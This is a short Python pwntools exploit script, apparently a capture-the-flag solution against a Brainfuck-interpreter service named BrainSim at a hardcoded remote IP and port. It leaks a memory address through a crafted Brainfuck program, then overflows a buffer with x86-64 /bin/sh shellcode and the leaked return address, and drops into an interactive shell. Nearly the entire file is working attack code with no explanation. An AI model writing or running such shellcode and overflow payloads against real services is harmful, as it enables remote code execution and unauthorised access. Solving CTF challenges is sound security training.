from pwn import *

REMOTE = True
IP,PORT = "103.152.242.58", 50601

SHELLCODE   = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #/bin/sh
BF_STACK    = ",----------[++++++++++>,----------]>>>>>>>>>.>.>.>.>.>.>.>." #Input until \n then print address
BF_PAYLOAD  = ",----------[++++++++++>,----------]" #For payload input until \n

if REMOTE:
    r = remote(IP,PORT)
else:
    r = process("../src/server/BrainSim")

#Get memmory array address
r.sendline("1") #Who uses option 2 anyway
r.sendline(BF_STACK)
r.recvuntil("\nOutput: ")
r.sendline("a"*2047)
a = r.recvuntil("\nInput : ")
addr = u64(a[:8])

#Insert shellcode
r.sendline("1")
r.sendline(BF_PAYLOAD)
payload  = SHELLCODE
payload += b'a'*(2048 - len(SHELLCODE) + 24) 
payload += p64(addr)
r.sendline(payload)
r.interactive()

# *hanging* around part